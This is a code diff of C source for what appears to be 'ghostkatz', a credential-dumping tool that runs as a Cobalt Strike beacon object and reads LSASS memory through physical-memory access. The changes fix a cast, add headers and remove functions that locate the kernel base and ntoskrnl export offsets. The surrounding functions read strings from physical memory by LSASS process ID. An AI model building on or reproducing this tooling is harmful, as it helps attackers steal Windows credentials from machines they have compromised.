@@ -1,6 +1,8 @@
 #include <windows.h>
-#include <stdlib.h>
+#include <psapi.h>
+
 #include "ghostkatz.h"
+#include "defs.h"
 
 BOOL isServiceInstalled()
 {
@@ -162,7 +164,7 @@ DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBy
     int ArraySize = sizeof(TargetByteArray) - 1;
     int arrayCounter = 0;
 
-    unsigned char* InternalByteArray = (char*)malloc(ArraySize * sizeof(char));
+    unsigned char* InternalByteArray = (unsigned char*)malloc(ArraySize * sizeof(char));
     DWORD PhysicalAddressWhereByteArrayFound = 0;
     BYTE readByteValue = 0;
 
@@ -213,34 +215,6 @@ DWORD64 ReadAddressAtPhysicalAddressLocation(HANDLE hFile, DWORD64 PhysicalAddre
     return address;
 }
 
-static PVOID lpImageBase[2048]; // Move lpImageBase off the stack to avoid '___chkstk_ms' error
-DWORD64 GetNtKernelVirtualAddresses(void)
-{
-    DWORD lpcbNeeded = 0;
-    DWORD cb = sizeof(lpImageBase);
-
-    if (!EnumDeviceDrivers(lpImageBase, cb, &lpcbNeeded) || lpcbNeeded < sizeof(PVOID)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "EnumDeviceDrivers failed: 0x%lx\n", GetLastError());
-        return 0;
-    }
-
-    return (DWORD64)lpImageBase[0];
-}
-
-
-// Used for getting EPROCESS structs eventually
-DWORD64 GetFunctionOffsetFromNtoskrnl(char* FunctionName)
-{
-    HMODULE Ntoskrnl = LoadLibraryA("ntoskrnl.exe");
-    DWORD64 GetFunctionOffset = (DWORD64)(GetProcAddress(Ntoskrnl, FunctionName)) - (DWORD64)Ntoskrnl;
-
-    //printf("[+] %s offset from Ntoskrnl base: 0x%llx\n", FunctionName, GetFunctionOffset);
-
-    FreeLibrary(Ntoskrnl);
-
-    return GetFunctionOffset;
-}
-
 wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStructPA, DWORD lower32bits, int LsassPID)
 {
     /*
@@ -280,6 +254,17 @@ wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStruct
 
     return UnicodeString;
 }
+
+// BOOL PrintHex(unsigned char* ByteArray, int ByteArraySize)
+// {
+//     for (int i = 0; i < ByteArraySize; i++)
+//     {
+//         printf("%02x", ByteArray[i]);
+//     }
+//     printf("\n");
+
+//     return TRUE;
+// }
 
 DWORD SearchPattern(unsigned char* mem, DWORD NumOfBytesToSearch, unsigned char* signature, DWORD signatureLen)
 {
